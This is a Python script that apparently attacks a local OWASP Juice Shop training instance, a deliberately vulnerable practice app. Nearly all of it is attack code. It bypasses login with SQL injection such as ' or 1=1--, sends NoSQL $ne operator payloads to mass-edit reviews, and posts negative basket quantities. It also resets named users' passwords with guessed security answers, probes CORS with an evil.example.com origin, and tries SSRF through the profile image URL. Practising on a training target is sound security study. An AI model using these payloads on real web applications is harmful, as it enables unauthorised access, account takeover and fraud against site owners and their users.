#!/usr/bin/env python3
import json, urllib.request, urllib.error
B="http://localhost:3000"
def req(m,p,d=None,t=None,extra=None):
    h={}
    if t:h["Authorization"]="Bearer "+t
    if extra:h.update(extra)
    b=None
    if d is not None:
        b=json.dumps(d).encode() if not isinstance(d,(bytes,str)) else (d if isinstance(d,bytes) else d.encode())
        h["Content-Type"]="application/json"
    r=urllib.request.Request(B+p,data=b,headers=h,method=m)
    try:
        x=urllib.request.urlopen(r); return x.status,x.read().decode("utf-8","replace"),dict(x.headers)
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace"),dict(e.headers)
    except Exception as e: return -1,str(e),{}
def j(m,p,d=None,t=None,extra=None):
    s,t2,h=req(m,p,d,t,extra)
    try: return s,json.loads(t2),h
    except Exception: return s,t2,h
def tok(e,pw="x"):
    s,d,_=j("POST","/rest/user/login",{"email":e,"password":pw})
    try:return d["authentication"]["token"]
    except:return None

admin=tok("' or 1=1--")
jim=tok("' or Email='jim@juice-sh.op'--")

# Password Hash Leak: check /api/Users/1 for password field
s,d,_=j("GET","/api/Users/1",t=admin)
print("Users1 keys:",list(d.get("data",{}).keys()) if isinstance(d,dict) else str(d)[:200])
print(str(d)[:400])
# whoami variants
for p in ["/rest/user/whoami","/rest/user/whoami/","/api/Users/me"]:
    s,d,h=req("GET",p,t=admin)
    print("WH",p,s,str(d)[:150])

# NoSQL Manipulation variants
for m,p,body in [
    ("PUT","/rest/products/reviews",{"id":{"$ne":-1},"message":"multi"}),
    ("PATCH","/rest/products/reviews",{"id":{"$ne":-1},"message":"multi"}),
    ("PUT","/rest/products/1/reviews",{"id":{"$ne":-1},"message":"multi1"}),
    ("PATCH","/rest/products/1/reviews",{"id":{"$ne":-1},"message":"multi1"}),
    ("PUT","/rest/products/reviews",{"id":["x"],"message":"multi"}),
]:
    s,d,_=j(m,p,body,t=admin)
    print("NM",m,p,s,str(d)[:120])

# Payback Time variants
for qty in [-1,-100,"-100",0]:
    s,d,_=j("POST","/api/BasketItems",{"ProductId":1,"BasketId":1,"quantity":qty},t=admin)
    print("PAY qty",qty,s,str(d)[:120])
# try existing basket item update
s,d,_=j("GET","/rest/basket/1",t=admin)
items=d["data"]["Products"] if isinstance(d,dict) and "data" in d else []
print("basket items:",[(i.get("BasketItem",{}).get("id") if isinstance(i.get("BasketItem"),dict) else i.get("id"),i.get("name")) for i in items[:5]])
for it in items[:3]:
    iid=it.get("BasketItem",{}).get("id") or it.get("id")
    if iid:
        s,d,_=j("PUT",f"/api/BasketItems/{iid}",{"quantity":-100},t=admin)
        print("PAY upd",iid,s,str(d)[:120])

# Christmas special: find product
s,d,_=j("GET","/api/Products/")
if isinstance(d,dict) and "data" in d:
    for p in d["data"]:
        if "christ" in (p.get("name","")+p.get("description","")).lower(): print("XMAS prod:",p["id"],p["name"])
for pid in range(1,35):
    s,d,_=j("GET",f"/api/Products/{pid}")
    if s==200 and isinstance(d,dict) and "data" in d:
        n=d["data"].get("name","")
        if "christ" in n.lower() or "special" in n.lower(): print("XMAS?",pid,n)

# Email Leak: Origin header
s,d,h=req("GET","/rest/user/whoami",t=admin,extra={"Origin":"http://evil.example.com"})
print("EL whoami",s,"ACAO:",h.get("Access-Control-Allow-Origin"))
s,d,h=req("GET","/api/Users/",t=admin,extra={"Origin":"http://evil.example.com"})
print("EL users",s,"ACAO:",h.get("Access-Control-Allow-Origin"))
# try accessing cross-domain sensitive endpoint
s,d,h=req("GET","/rest/user/authentication-details/",t=admin,extra={"Origin":"http://x.com"})
print("EL authdet",s,str(d)[:150],"ACAO:",h.get("Access-Control-Allow-Origin"))

# Security question answers -> reset passwords
answers={
 "bjoern@juice-sh.op":"Zaya",
 "bjoern.kimminich@gmail.com":"Zaya",
 "jim@juice-sh.op":"sam",
 "bender@juice-sh.op":"slurm",
 "uvogin@juice-sh.op":"Slurm",
 "morty@juice-sh.op":"5f4dcc3b5aa765d61d8327deb882cf99",
}
for em,a in answers.items():
    s,d,_=j("POST","/rest/user/reset-password",{"email":em,"answer":a,"new":"Pwned123!","repeat":"Pwned123!"})
    print("RESET",em,a,"->",s,str(d)[:120])

# Login guesses
for em,pw in [("support@juice-sh.op","support"),("support@juice-sh.op","J00"),
              ("bjoern.kimminich@gmail.com","bjoern"),("chris.pike@juice-sh.op","x")]:
    s,d,_=j("POST","/rest/user/login",{"email":em,"password":pw})
    print("LOGIN",em,pw,"->",s,str(d)[:100])
# GDPR erasure via sqli
s,d,_=j("POST","/rest/user/login",{"email":"' or email='chris.pike@juice-sh.op'--","password":"x"})
print("GDPR sqli:",s,str(d)[:150])

# SSRF profile image
for m,p,body in [("POST","/profile/image/url",{"image":"http://localhost:3000/ftp/acquisitions.md"}),
                 ("PUT","/profile/image/url",{"image":"http://localhost:3000/ftp/acquisitions.md"}),
                 ("POST","/profile/image/file",{"image":"http://localhost:3000/ftp/acquisitions.md"})]:
    s,d,_=j(m,p,body,t=admin)
    print("SSRF",m,p,s,str(d)[:150])

# Expired coupon / campaigns
s,d,_=j("GET","/rest/campaigns")
print("campaigns:",s,str(d)[:300])
s,d,_=j("GET","/rest/coupon/0")
print("coupon0:",s,str(d)[:200])

# Deluxe fraud more
for body in [{"paymentMode":"card","paymentId":"deluxe"},{"paymentMode":"coupon","paymentId":"x"},{}]:
    s,d,_=j("POST","/rest/deluxe-membership",body,t=admin)
    print("DELUXE",body,"->",s,str(d)[:120])
# PUT user deluxeToken
s,d,_=j("GET","/api/Users/1",t=admin)
s,d,_=j("PUT","/api/Users/1",{"deluxeToken":"x"},t=admin)
print("PUT deluxeToken:",s,str(d)[:150])
